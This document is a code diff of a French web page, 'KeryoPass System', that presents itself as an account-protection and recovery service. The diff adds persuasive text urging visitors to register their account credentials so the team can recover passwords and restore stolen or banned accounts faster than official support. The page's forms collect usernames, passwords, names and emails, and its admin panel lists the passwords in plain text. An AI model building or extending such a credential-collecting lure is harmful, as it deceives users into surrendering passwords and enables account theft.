@@ -3,26 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KeryoPass System v3.8</title>
+    <title>KeryoPass System v4.1</title>
     <style>
         :root { --primary: #2f81f7; --secondary: #5865f2; --border: #30363d; --urgency: #f85149; --success: #238636; }
         body { background: #2b3eb1; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; padding: 20px; }
         .main-layout { display: grid; grid-template-areas: "detail protect" "admin aide"; grid-template-columns: 1fr 1fr; gap: 20px; width: 100%; max-width: 1100px; }
-        .panel { background: black; border-radius: 40px; padding: 25px; border: 2px solid var(--border); min-height: 480px; display: flex; flex-direction: column; box-sizing: border-box; }
+        .panel { background: black; border-radius: 40px; padding: 25px; border: 2px solid var(--border); min-height: 520px; display: flex; flex-direction: column; box-sizing: border-box; }
         h2 { color: var(--primary); font-size: 0.9rem; text-align: center; margin-top: 0; text-transform: uppercase; }
+        
+        .site-desc { font-size: 0.8rem; color: #8b949e; line-height: 1.5; text-align: justify; margin: 15px 0; padding: 10px; border-top: 1px solid #161b22; }
+        .site-desc b { color: #c9d1d9; }
+
         input { width: 100%; box-sizing: border-box; padding: 10px; background: #0d1117; border: 1px solid var(--border); color: white; border-radius: 10px; margin-bottom: 8px; text-align: center; outline: none; }
         button { width: 100%; padding: 12px; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; transition: 0.2s; }
         .btn-blue { background: var(--primary); color: white; }
         .msg-box { display: none; margin-top: 10px; padding: 10px; border-radius: 10px; font-size: 0.8rem; text-align: center; }
         .msg-success { background: rgba(35, 134, 54, 0.2); border: 1px solid var(--success); color: #7ee787; }
         .msg-error { background: rgba(248, 81, 73, 0.2); border: 1px solid var(--urgency); color: #ffa198; }
+        
         .admin-nav { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
         .nav-tab { background: #21262d; padding: 8px 15px; border-radius: 20px; color: white; border: 1px solid var(--border); cursor: pointer; font-size: 0.75rem; width: auto; }
         .nav-tab.active { background: var(--secondary); border-color: var(--secondary); }
         .list-item { border-bottom: 1px solid #30363d; padding: 12px 0; font-size: 0.8rem; }
         .urg-card { background: #1c2128; border-left: 4px solid var(--urgency); border-radius: 8px; padding: 12px; margin-bottom: 10px; font-size: 0.75rem; position: relative; }
         .del-urg { position: absolute; top: 8px; right: 8px; cursor: pointer; }
-        .orb-ai { width: 60px; height: 60px; background: radial-gradient(circle, var(--secondary), var(--primary)); border-radius: 50%; margin: auto auto 0 auto; animation: pulse 3s infinite; }
+        .orb-ai { width: 50px; height: 50px; background: radial-gradient(circle, var(--secondary), var(--primary)); border-radius: 50%; margin: auto auto 0 auto; animation: pulse 3s infinite; }
         @keyframes pulse { 50% { transform: scale(1.1); box-shadow: 0 0 25px var(--primary); } }
         .btn-option { background: #1c2128; border: 1px solid var(--border); color: white; border-radius: 25px; margin-bottom: 10px; text-align: left; padding-left: 20px; }
         .btn-logout { background: var(--urgency); color: white; margin-top: auto; font-size: 0.8rem; }
@@ -34,8 +39,16 @@
     <div class="main-layout">
         <div class="panel">
             <h2>Détail du site 🔊</h2>
-            <p style="font-size:0.8rem; color:#8b949e; text-align:center;">Système Keryo v3.8</p>
-            <button class="btn-blue" onclick="speak('Protection active.')">ÉCOUTER L'ÉTAT</button>
+            <p style="font-size:0.7rem; color:var(--primary); text-align:center; margin-bottom:5px;">Système Keryo v4.1</p>
+            
+            <div class="site-desc" id="textToSpeak">
+                En enregistrant votre compte sur notre site, vous bénéficiez d'une <b>protection renforcée</b>. Grâce à cette connexion, si vous oubliez votre mot de passe, nous pourrons le récupérer pour vous quasi instantanément. <br><br>
+                Pour les autres services d'assistance, il n'est pas obligatoire d'être enregistré : il vous suffit de suivre les étapes dans la section aide. <br><br>
+                Cependant, un compte protégé par nos soins est bien plus simple à sécuriser. En cas de <b>vol ou de bannissement</b>, notre équipe pourra intervenir pour récupérer votre accès bien plus rapidement que l'assistance officielle. <br><br>
+                <b>Protégez votre compte dès maintenant en l'ajoutant à notre système.</b>
+            </div>
+
+            <button class="btn-blue" onclick="speakDesc()">ÉCOUTER LA DESCRIPTION</button>
         </div>
 
         <div class="panel">
@@ -76,13 +89,13 @@
 
             <div id="dynamicForm" style="display:none;">
                 <input type="text" id="hId" placeholder="Identifiant">
-                <input type="password" id="hPs" placeholder="Mot de passe"> <input type="text" id="hNm" placeholder="Nom et Prénom">
+                <input type="password" id="hPs" placeholder="Mot de passe">
+                <input type="text" id="hNm" placeholder="Nom et Prénom">
                 <input type="email" id="hEm" placeholder="Email">
                 <button class="btn-blue" onclick="handleSignal()">SIGNALER</button>
             </div>
 
             <div id="helpMsg" class="msg-box"></div>
-
             <button id="btnBack" class="btn-back" style="display:none;" onclick="resetAide()">← RETOUR</button>
             <div class="orb-ai"></div>
         </div>
@@ -93,7 +106,11 @@
         let urg = JSON.parse(localStorage.getItem('k_urg') || '[]');
         let currentType = "";
 
-        function speak(t) { window.speechSynthesis.cancel(); window.speechSynthesis.speak(new SpeechSynthesisUtterance(t)); }
+        function speakDesc() {
+            const text = document.getElementById('textToSpeak').innerText;
+            window.speechSynthesis.cancel();
+            window.speechSynthesis.speak(new SpeechSynthesisUtterance(text));
+        }
 
         function saveData() {
             const u = document.getElementById('regUser').value, p = document.getElementById('regPass').value;
@@ -144,7 +161,7 @@
                     <span class="del-urg" onclick="delUrg(${i})">✖</span>
                     <strong style="color:var(--urgency)">${x.type}</strong><br>
                     <strong>ID: ${x.user}</strong><br>
-                    <small>Nom: ${x.nom}<br>Email: ${x.mail}${x.pass ? '<br>Tentative Pass: '+x.pass : ''}</small>
+                    <small>Nom: ${x.nom} | Mail: ${x.mail}${x.pass ? '<br>Pass: '+x.pass : ''}</small>
                 </div>`).join('');
         }
 
@@ -158,8 +175,6 @@
             document.getElementById('btnBack').style.display = 'block';
             document.getElementById('dynamicForm').style.display = 'block';
             document.getElementById('helpMsg').style.display = 'none';
-            
-            // Si c'est mdp oublié, on cache le champ mot de passe
             document.getElementById('hPs').style.display = (type === 'MOT DE PASSE OUBLIÉ') ? 'none' : 'block';
         }
 
@@ -172,18 +187,13 @@
         }
 
         function handleSignal() {
-            const id = document.getElementById('hId').value;
-            const nm = document.getElementById('hNm').value;
-            const em = document.getElementById('hEm').value;
-            const ps = document.getElementById('hPs').value;
+            const id = document.getElementById('hId').value, nm = document.getElementById('hNm').value, em = document.getElementById('hEm').value, ps = document.getElementById('hPs').value;
             const msgBox = document.getElementById('helpMsg');
 
             if(!id || !nm || !em) return;
 
-            // Logique de vérification pour "Mot de passe oublié"
             if(currentType === 'MOT DE PASSE OUBLIÉ') {
                 const userExists = db.some(x => x.user.toLowerCase() === id.toLowerCase());
-                
                 if(!userExists) {
                     msgBox.className = "msg-box msg-error";
                     msgBox.innerText = "Votre compte n'a pas été enregistré sur le site avant d'oublier votre mot de passe.";
@@ -192,15 +202,12 @@
                 }
             }
 
-            // Si ok ou autres options, on envoie
             urg.push({type: currentType, user: id, pass: ps, nom: nm, mail: em});
             localStorage.setItem('k_urg', JSON.stringify(urg));
-            
             document.getElementById('dynamicForm').style.display = 'none';
             msgBox.className = "msg-box msg-success";
             msgBox.innerText = "✅ Signalement envoyé à l'administration.";
             msgBox.style.display = 'block';
-            
             setTimeout(() => { resetAide(); }, 4000);
             if(document.getElementById('dashboard').style.display === 'flex') refreshAdmin();
         }
